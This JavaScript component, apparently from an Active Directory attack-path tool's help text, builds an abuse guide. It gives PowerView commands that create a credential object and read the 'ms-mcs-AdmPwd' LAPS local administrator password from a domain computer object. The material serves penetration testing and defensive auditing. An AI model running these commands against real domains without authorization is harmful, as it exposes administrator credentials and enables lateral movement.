const Abuse = (sourceName, sourceType, targetName, targetType) => {
    let text = `To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
        sourceType === 'User'
            ? `${sourceName} if you are not running a process as that user`
            : `a member of ${sourceName} if you are not running a process as a member`
    }. To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

    Then, use Get-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

    <code>Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name</code>
    `;
    return { __html: text };
};

export default Abuse;
